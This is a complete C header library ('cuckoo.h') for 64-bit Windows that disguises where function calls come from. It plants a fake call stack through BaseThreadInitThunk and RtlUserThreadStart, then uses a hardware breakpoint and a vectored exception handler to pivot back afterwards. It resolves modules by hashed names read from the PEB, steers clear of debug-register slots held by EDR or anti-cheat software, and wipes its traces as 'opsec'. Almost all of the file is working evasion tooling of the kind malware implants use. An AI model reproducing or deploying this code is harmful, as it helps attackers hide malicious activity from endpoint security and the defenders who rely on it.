/*
 * cuckoo.h -- v3.2 RA spoofer (VEH + HW BP).
 *
 * Plants chain on cu_dispatch's local alloc, arms a free DR slot at
 * BTITN+0x14, jmps target. Target's ret to BTITN+0x14 fires #DB; cu_veh
 * pivots back. Mid-call chain: target -> BTITN+0x14 -> RtlUTS+0x21 -> 0.
 *
 * nargs in [0..5]. Arg 6's stack slot collides with BTITN's parent-RA
 * slot (btitn_prolog=0x28 puts both at planted_top+0x30).
 *
 *   cuckoo_init();
 *   cuckoo_call(fn, nargs, ...);
 *   cuckoo_clear();
 *   cuckoo_selftest();
 */

#ifndef CUCKOO_H_INCLUDED
#define CUCKOO_H_INCLUDED

#include <Windows.h>
#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

int   cuckoo_init(void);
void* cuckoo_call(void* fn, size_t nargs, ...);
void  cuckoo_clear(void);
int   cuckoo_selftest(void);

#ifndef CUCKOO_KERNEL32_HASH
#define CUCKOO_KERNEL32_HASH         0xbc5d4571u
#endif
#ifndef CUCKOO_NTDLL_HASH
#define CUCKOO_NTDLL_HASH            0x4f576ca1u
#endif
#ifndef CUCKOO_FAKE_PARENT_L1_SYMBOL
#define CUCKOO_FAKE_PARENT_L1_SYMBOL "BaseThreadInitThunk"
#endif
#ifndef CUCKOO_FAKE_PARENT_L2_SYMBOL
#define CUCKOO_FAKE_PARENT_L2_SYMBOL "RtlUserThreadStart"
#endif
#ifndef CUCKOO_LOG
#define CUCKOO_LOG                   0
#endif
#ifndef CUCKOO_NO_OPSEC_WIPE
#define CUCKOO_NO_OPSEC_WIPE         0
#endif

/* slot_a 0x18 -> planted_top ≡ 8 mod 16 (Win64 ABI for jmp entry).
 * slot_c must fit in cu_dispatch's 0x108 alloc. */
#define CUCKOO_SLOT_A_OFFSET         0x18
#define CUCKOO_SLOT_C_CAP            0x100

#ifdef __cplusplus
}
#endif

#ifdef CUCKOO_IMPLEMENTATION

#ifdef __cplusplus
extern "C" {
#endif

#include <intrin.h>

#if CUCKOO_LOG
#  include <stdio.h>
#  define CU_LOG(...) do { fprintf(stderr, "[cuckoo] " __VA_ARGS__); } while(0)
#else
#  define CU_LOG(...) do {} while(0)
#endif

/* PEB / LDR layouts. */
typedef struct _CU_UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} CU_UNICODE_STRING;

typedef struct _CU_PEB_LDR_DATA {
    DWORD       Length, Initialized;
    LPVOID      SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
    LPVOID      EntryInProgress;
} CU_PEB_LDR_DATA;

typedef struct _CU_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY        InMemoryOrderModuleList;
    LIST_ENTRY        InInitializationOrderModuleList;
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    CU_UNICODE_STRING FullDllName;
    CU_UNICODE_STRING BaseDllName;
} CU_LDR_DATA_TABLE_ENTRY;

typedef struct _CU_PEB_MIN {
    BYTE   Reserved1[2];
    BYTE   BeingDebugged;
    BYTE   Reserved2[1];
    PVOID  Reserved3[2];
    CU_PEB_LDR_DATA* Ldr;
} CU_PEB_MIN;

/* CU_SPOOFER offsets are load-bearing; keep in sync with CU_* EQUs in asm. */
typedef struct _CU_SPOOFER {
    PVOID  SpoofFunctionPointer;   /* 0x00 */
    PVOID  FakeParentL1;           /* 0x08 -- BTITN+0x14 (target's pseudo-RA) */
    PVOID  FakeParentL2;           /* 0x10 -- RtlUTS+0x21 */
    UINT64 Nargs;                  /* 0x18 */
    PVOID  Arg01;                  /* 0x20 */
    PVOID  Arg02;                  /* 0x28 */
    PVOID  Arg03;                  /* 0x30 */
    PVOID  Arg04;                  /* 0x38 */
    PVOID  Arg05;                  /* 0x40 -- stack arg @ planted_top+0x28 */
    UINT64 SlotA;                  /* 0x48 -- body offset where FakeL1 plants */
    UINT64 SlotB;                  /* 0x50 -- body offset where FakeL2 plants */
    UINT64 SlotC;                  /* 0x58 -- body offset where terminator plants */
    UINT64 SavedRsp;               /* 0x60 -- written by cu_dispatch */
    UINT64 ReturnValue;            /* 0x68 -- written by cu_veh */
    UINT64 DrSlot;                 /* 0x70 -- DR slot (0..3) chosen by cu_arm_hwbp */
} CU_SPOOFER;

extern void cu_dispatch(CU_SPOOFER* s);
extern void cu_dispatch_continuation(void);

/* --- Module / symbol resolution --------------------------------------- */

#define CU_FH_RND_SEED  0xDC072B8Au
#define CU_ROR8(v)      ((DWORD)((v) >> 8) | (DWORD)((v) << 24))

static DWORD cu_hash_module(const wchar_t* name, USHORT byte_length) {
    DWORD hash = CU_FH_RND_SEED;
    DWORD i = 0;
    const unsigned char* p = (const unsigned char*)name;
    while (i < (DWORD)(byte_length / 2)) {
        WORD partial = (WORD)(*(const WORD*)(p + i++) | 0x2020u);
        hash ^= (DWORD)partial + CU_ROR8(hash);
    }
    return hash;
}

static HMODULE cu_get_module_by_hash(DWORD target) {
    CU_PEB_MIN* peb = (CU_PEB_MIN*)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* cur = head->Flink; cur && cur != head; cur = cur->Flink) {
        CU_LDR_DATA_TABLE_ENTRY* e = (CU_LDR_DATA_TABLE_ENTRY*)cur;
        if (e->BaseDllName.Buffer && e->BaseDllName.Length &&
            cu_hash_module(e->BaseDllName.Buffer, e->BaseDllName.Length) == target)
            return (HMODULE)e->DllBase;
    }
    return NULL;
}

static int cu_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (int)(unsigned char)*a - (int)(unsigned char)*b;
}

static UINT64 cu_get_symbol_address(HMODULE module, const char* name) {
    if (!module) return 0;
    UINT64 base = (UINT64)module;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* dd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress || !dd->Size) return 0;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + dd->VirtualAddress);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*) (base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (cu_strcmp((const char*)(base + names[i]), name) != 0) continue;
        DWORD rva = funcs[ordinals[i]];
        if (rva < dd->VirtualAddress || rva >= dd->VirtualAddress + dd->Size) {
            return base + rva;
        }
        const char* fwd = (const char*)(base + rva);
        const char* dot = fwd;
        while (*dot && *dot != '.') dot++;
        if (!*dot) return 0;
        size_t dll_len = (size_t)(dot - fwd);
        if (dll_len == 0 || dll_len > 56) return 0;

        wchar_t wname[64];
        for (size_t k = 0; k < dll_len; k++) wname[k] = (wchar_t)fwd[k];
        size_t wlen = dll_len;
        int has_dll = 0;
        if (dll_len >= 4) {
            wchar_t e0 = wname[dll_len-4], e1 = wname[dll_len-3];
            wchar_t e2 = wname[dll_len-2], e3 = wname[dll_len-1];
            if (e0 >= L'A' && e0 <= L'Z') e0 += 32;
            if (e1 >= L'A' && e1 <= L'Z') e1 += 32;
            if (e2 >= L'A' && e2 <= L'Z') e2 += 32;
            if (e3 >= L'A' && e3 <= L'Z') e3 += 32;
            if (e0 == L'.' && e1 == L'd' && e2 == L'l' && e3 == L'l') has_dll = 1;
        }
        if (!has_dll) {
            wname[wlen++] = L'.';
            wname[wlen++] = L'd';
            wname[wlen++] = L'l';
            wname[wlen++] = L'l';
        }
        DWORD h = cu_hash_module(wname, (USHORT)(wlen * 2));
        HMODULE forward_mod = cu_get_module_by_hash(h);
        if (!forward_mod) return 0;
        return cu_get_symbol_address(forward_mod, dot + 1);
    }
    return 0;
}

static void cu_zero(void* p, size_t n) {
    volatile unsigned char* q = (volatile unsigned char*)p;
    while (n--) *q++ = 0;
}

/* --- Unwind metadata probes ------------------------------------------ */

static int cu_read_size_of_prolog(DWORD64 fn_addr, UCHAR* out_size) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf || !image_base) return 1;
    UCHAR* unwind = (UCHAR*)(image_base + rf->UnwindData);
    *out_size = unwind[1];
    return 0;
}

static int cu_get_unwind_delta(DWORD64 fn_addr, DWORD* out_delta) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf || !image_base) return 1;

    LPVOID stk = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stk) return 1;
    DWORD64 fake_rsp = (DWORD64)stk + 2048;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    ctx.Rip = fn_addr;
    ctx.Rsp = fake_rsp;
    PVOID hd = NULL; DWORD64 ef = 0;
    RtlVirtualUnwind(UNW_FLAG_NHANDLER, image_base, ctx.Rip, rf, &ctx, &hd, &ef, NULL);

    *out_delta = (DWORD)(ctx.Rsp - fake_rsp);
    VirtualFree(stk, 0, MEM_RELEASE);
    return 0;
}

/* --- L1/L2 offset selection ------------------------------------------ */

static DWORD cu_find_post_call_offset(const BYTE* buf, DWORD size) {
    for (DWORD i = 0; i + 2 <= size; i++) {
        BYTE b0 = buf[i];
        if (b0 == 0xE8 && i + 5 <= size) return i + 5;
        if (b0 == 0xFF) {
            BYTE b1 = buf[i + 1];
            if (b1 >= 0xD0 && b1 <= 0xD7) return i + 2;
            if (b1 == 0x15 && i + 6 <= size) return i + 6;
        }
        if (b0 == 0x41 && i + 3 <= size && buf[i + 1] == 0xFF) {
            BYTE b2 = buf[i + 2];
            if (b2 >= 0xD0 && b2 <= 0xD7) return i + 3;
        }
    }
    return 0;
}

/* Authoritative L2 picker: walk our own stack with RtlVirtualUnwind. */
static DWORD cu_discover_btitn_return_offset(DWORD64 btitn_addr, DWORD64 rtlu_addr) {
    DWORD64 b_ib = 0, r_ib = 0;
    PRUNTIME_FUNCTION b_rf = RtlLookupFunctionEntry(btitn_addr, &b_ib, NULL);
    PRUNTIME_FUNCTION r_rf = RtlLookupFunctionEntry(rtlu_addr,  &r_ib, NULL);
    if (!b_rf || !r_rf) return 0;
    DWORD64 b_begin = b_ib + b_rf->BeginAddress, b_end = b_ib + b_rf->EndAddress;
    DWORD64 r_begin = r_ib + r_rf->BeginAddress, r_end = r_ib + r_rf->EndAddress;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    RtlCaptureContext(&ctx);

    int saw_btitn = 0;
    for (int i = 0; i < 32 && ctx.Rip != 0; i++) {
        if (saw_btitn) {
            if (ctx.Rip >= r_begin && ctx.Rip < r_end) {
                return (DWORD)(ctx.Rip - rtlu_addr);
            }
            return 0;
        }
        if (ctx.Rip >= b_begin && ctx.Rip < b_end) saw_btitn = 1;

        DWORD64 ib = 0;
        PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(ctx.Rip, &ib, NULL);
        if (rf) {
            PVOID hd = NULL; DWORD64 ef = 0;
            RtlVirtualUnwind(UNW_FLAG_NHANDLER, ib, ctx.Rip, rf, &ctx, &hd, &ef, NULL);
        } else {
            ctx.Rip = *(DWORD64*)ctx.Rsp;
            ctx.Rsp += 8;
        }
    }
    return 0;
}

static DWORD cu_pick_post_call_or_fallback(DWORD64 fn_addr, UCHAR size_of_prolog) {
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf = RtlLookupFunctionEntry(fn_addr, &image_base, NULL);
    if (!rf) return (DWORD)size_of_prolog + 1;
    DWORD fn_size = rf->EndAddress - rf->BeginAddress;
    if (fn_size <= size_of_prolog) return (DWORD)size_of_prolog + 1;
    DWORD body = size_of_prolog;
    DWORD post = cu_find_post_call_offset(
        (const BYTE*)fn_addr + body, fn_size - body);
    if (post == 0) return (DWORD)size_of_prolog + 1;
    DWORD abs_off = body + post;
    if (abs_off >= fn_size) return (DWORD)size_of_prolog + 1;
    return abs_off;
}

/* --- Process-global state -------------------------------------------- */

static PVOID         g_cu_fake_parent_l1 = 0;   /* BTITN+0x14 */
static PVOID         g_cu_fake_parent_l2 = 0;   /* RtlUTS+0x21 */
static UINT64        g_cu_slot_a         = 0;   /* body offset where FakeL1 plants */
static UINT64        g_cu_slot_b         = 0;   /* body offset where FakeL2 plants */
static UINT64        g_cu_slot_c         = 0;   /* body offset where 0 terminator plants */
static DWORD         g_cu_tls_index      = TLS_OUT_OF_INDEXES;
static PVOID         g_cu_veh_handle     = NULL;

/* 0=uninit  1=in-progress  2=ready. */
static volatile LONG g_cu_init_state = 0;

/* --- VEH + HW-BP arming ---------------------------------------------- */

/* Picks lowest free DR slot to avoid clobbering EDR/anti-cheat HWBPs. */
int cu_arm_hwbp(CU_SPOOFER* s) {
    if (!TlsSetValue(g_cu_tls_index, s)) return 1;

    CONTEXT ctx;
    cu_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx)) return 2;

    int slot = -1;
    for (int n = 0; n < 4; n++) {
        if (!(ctx.Dr7 & (1ULL << (2 * n)))) { slot = n; break; }
    }
    if (slot < 0) return 4;

    DWORD64* drs[4] = { &ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3 };
    *drs[slot] = (DWORD64)s->FakeParentL1;

    /* Execute BP: R/W=00, LEN=00, L_n=1. */
    UINT64 mask = (3ULL << (2 * slot)) | (0xFULL << (16 + 4 * slot));
    ctx.Dr7 &= ~mask;
    ctx.Dr7 |= (1ULL << (2 * slot));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!SetThreadContext(GetCurrentThread(), &ctx)) return 3;

    s->DrSlot = (UINT64)slot;
    return 0;
}

/* Catches #DB at BTITN+0x14, pivots back to cu_dispatch_continuation. */
LONG WINAPI cu_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    if ((UINT64)ep->ExceptionRecord->ExceptionAddress != (UINT64)g_cu_fake_parent_l1)
        return EXCEPTION_CONTINUE_SEARCH;

    CU_SPOOFER* s = (CU_SPOOFER*)TlsGetValue(g_cu_tls_index);
    if (!s || s->DrSlot >= 4) return EXCEPTION_CONTINUE_SEARCH;

    /* Confirm hit was on our slot, not EDR's. */
    if (!(ep->ContextRecord->Dr6 & (1ULL << s->DrSlot)))
        return EXCEPTION_CONTINUE_SEARCH;

    s->ReturnValue = (UINT64)ep->ContextRecord->Rax;

    ep->ContextRecord->Rsp = (DWORD64)s->SavedRsp;
    ep->ContextRecord->Rcx = (DWORD64)s;
    ep->ContextRecord->Rip = (DWORD64)cu_dispatch_continuation;

    /* Disarm our slot only. */
    DWORD64* drs[4] = { &ep->ContextRecord->Dr0, &ep->ContextRecord->Dr1,
                        &ep->ContextRecord->Dr2, &ep->ContextRecord->Dr3 };
    *drs[s->DrSlot] = 0;
    ep->ContextRecord->Dr6 &= ~(1ULL << s->DrSlot);
    ep->ContextRecord->Dr7 &= ~(1ULL << (2 * s->DrSlot));
    ep->ContextRecord->ContextFlags |= CONTEXT_DEBUG_REGISTERS;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* --- Init / clear / call --------------------------------------------- */

static int cu_init_internal(void) {
    if (g_cu_init_state == 2) return 0;
    LONG prev = InterlockedCompareExchange(&g_cu_init_state, 1, 0);
    if (prev == 2) return 0;
    if (prev == 1) {
        while (g_cu_init_state == 1) YieldProcessor();
        return (g_cu_init_state == 2) ? 0 : 1;
    }

    int err = 1;
    do {
        HMODULE k32   = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
        HMODULE ntdll = cu_get_module_by_hash(CUCKOO_NTDLL_HASH);
        if (!k32 || !ntdll) { CU_LOG("kernel32/ntdll not found\n"); break; }

        UINT64 btitn = cu_get_symbol_address(k32,   CUCKOO_FAKE_PARENT_L1_SYMBOL);
        UINT64 rtlu  = cu_get_symbol_address(ntdll, CUCKOO_FAKE_PARENT_L2_SYMBOL);
        if (!btitn || !rtlu) { CU_LOG("fake-parent symbols not found\n"); break; }

        UCHAR btitn_size_prolog = 0, rtlu_size_prolog = 0;
        if (cu_read_size_of_prolog(btitn, &btitn_size_prolog) != 0) {
            CU_LOG("BTITN UNWIND_INFO not found\n"); break;
        }
        if (cu_read_size_of_prolog(rtlu, &rtlu_size_prolog) != 0) {
            CU_LOG("RtlUTS UNWIND_INFO not found\n"); break;
        }

        DWORD btitn_delta = 0, rtlu_delta = 0;
        if (cu_get_unwind_delta(btitn + btitn_size_prolog + 1, &btitn_delta) != 0 ||
            cu_get_unwind_delta(rtlu  + rtlu_size_prolog  + 1, &rtlu_delta)  != 0) {
            CU_LOG("unwind probe failed\n"); break;
        }
        DWORD btitn_prolog_total = btitn_delta - 8;
        DWORD rtlu_prolog_total  = rtlu_delta  - 8;

        /* Slots relative to body_rsp. slot_b/c follow each frame's prolog. */
        UINT64 slot_a = (UINT64)CUCKOO_SLOT_A_OFFSET;
        UINT64 slot_b = slot_a + 8 + btitn_prolog_total;
        UINT64 slot_c = slot_b + 8 + rtlu_prolog_total;
        if (slot_c >= CUCKOO_SLOT_C_CAP) {
            CU_LOG("BTITN+RtlUTS prologs too large (slot_c=0x%llx >= cap=0x%lx)\n",
                   (unsigned long long)slot_c, (unsigned long)CUCKOO_SLOT_C_CAP);
            break;
        }

        DWORD btitn_off = cu_pick_post_call_or_fallback(btitn, btitn_size_prolog);
        DWORD rtlu_off  = cu_discover_btitn_return_offset(btitn, rtlu);
        if (rtlu_off == 0) rtlu_off = cu_pick_post_call_or_fallback(rtlu, rtlu_size_prolog);

        if (g_cu_tls_index == TLS_OUT_OF_INDEXES) {
            g_cu_tls_index = TlsAlloc();
            if (g_cu_tls_index == TLS_OUT_OF_INDEXES) {
                CU_LOG("TlsAlloc failed\n"); break;
            }
        }
        if (!g_cu_veh_handle) {
            g_cu_veh_handle = AddVectoredExceptionHandler(1, cu_veh);
            if (!g_cu_veh_handle) {
                CU_LOG("AddVectoredExceptionHandler failed\n"); break;
            }
        }

        g_cu_fake_parent_l1 = (PVOID)(btitn + btitn_off);
        g_cu_fake_parent_l2 = (PVOID)(rtlu  + rtlu_off);
        g_cu_slot_a         = slot_a;
        g_cu_slot_b         = slot_b;
        g_cu_slot_c         = slot_c;

        CU_LOG("init ok (VEH+HWBP): "
               "L1=%p (BTITN+0x%lx) L2=%p (RtlUTS+0x%lx) "
               "btitn_prolog=0x%lx rtlu_prolog=0x%lx "
               "slot_a=0x%llx slot_b=0x%llx slot_c=0x%llx tls=%lu\n",
               g_cu_fake_parent_l1, (unsigned long)btitn_off,
               g_cu_fake_parent_l2, (unsigned long)rtlu_off,
               (unsigned long)btitn_prolog_total, (unsigned long)rtlu_prolog_total,
               (unsigned long long)slot_a, (unsigned long long)slot_b,
               (unsigned long long)slot_c, (unsigned long)g_cu_tls_index);
        err = 0;
    } while (0);

    if (err) {
        if (g_cu_veh_handle) {
            RemoveVectoredExceptionHandler(g_cu_veh_handle);
            g_cu_veh_handle = NULL;
        }
        if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
            TlsFree(g_cu_tls_index);
            g_cu_tls_index = TLS_OUT_OF_INDEXES;
        }
        g_cu_fake_parent_l1 = 0;
        g_cu_fake_parent_l2 = 0;
        g_cu_slot_a = 0;
        g_cu_slot_b = 0;
        g_cu_slot_c = 0;
        InterlockedExchange(&g_cu_init_state, 0);
        return 1;
    }
    InterlockedExchange(&g_cu_init_state, 2);
    return 0;
}

int cuckoo_init(void) { return cu_init_internal(); }

void cuckoo_clear(void) {
    if (g_cu_veh_handle) {
        RemoveVectoredExceptionHandler(g_cu_veh_handle);
        g_cu_veh_handle = NULL;
    }
    if (g_cu_tls_index != TLS_OUT_OF_INDEXES) {
        TlsFree(g_cu_tls_index);
        g_cu_tls_index = TLS_OUT_OF_INDEXES;
    }
    InterlockedExchange(&g_cu_init_state, 0);
    g_cu_fake_parent_l1 = 0;
    g_cu_fake_parent_l2 = 0;
    g_cu_slot_a = 0;
    g_cu_slot_b = 0;
    g_cu_slot_c = 0;
}

void* cuckoo_call(void* fn, size_t nargs, ...) {
    if (nargs > 5) return NULL;
    if (cu_init_internal() != 0) return NULL;

    CU_SPOOFER s;
    cu_zero(&s, sizeof(s));
    s.SpoofFunctionPointer = fn;
    s.FakeParentL1         = g_cu_fake_parent_l1;
    s.FakeParentL2         = g_cu_fake_parent_l2;
    s.Nargs                = (UINT64)nargs;
    s.SlotA                = g_cu_slot_a;
    s.SlotB                = g_cu_slot_b;
    s.SlotC                = g_cu_slot_c;

    PVOID* arg_slots[5] = { &s.Arg01, &s.Arg02, &s.Arg03, &s.Arg04, &s.Arg05 };
    va_list ap;
    va_start(ap, nargs);
    for (size_t i = 0; i < nargs; i++) *arg_slots[i] = va_arg(ap, PVOID);
    va_end(ap);

    cu_dispatch(&s);
    void* ret = (void*)(uintptr_t)s.ReturnValue;

#if !CUCKOO_NO_OPSEC_WIPE
    cu_zero(&s, sizeof(s));
#endif
    return ret;
}

int cuckoo_selftest(void) {
    if (cu_init_internal() != 0) { CU_LOG("selftest: init failed\n"); return 1; }
    HMODULE k32 = cu_get_module_by_hash(CUCKOO_KERNEL32_HASH);
    if (!k32) { CU_LOG("selftest: no kernel32\n"); return 2; }
    UINT64 fn = cu_get_symbol_address(k32, "GetCurrentProcessId");
    if (!fn) { CU_LOG("selftest: no GetCurrentProcessId\n"); return 3; }

    DWORD direct  = GetCurrentProcessId();
    DWORD spoofed = (DWORD)(uintptr_t)cuckoo_call((void*)fn, 0);
    if (direct != spoofed) {
        CU_LOG("selftest: mismatch direct=%lu spoofed=%lu\n",
               (unsigned long)direct, (unsigned long)spoofed);
        return 4;
    }
    CU_LOG("selftest: ok (pid=%lu)\n", (unsigned long)direct);
    return 0;
}

#ifdef __cplusplus
}
#endif

#endif /* CUCKOO_IMPLEMENTATION */
#endif /* CUCKOO_H_INCLUDED */
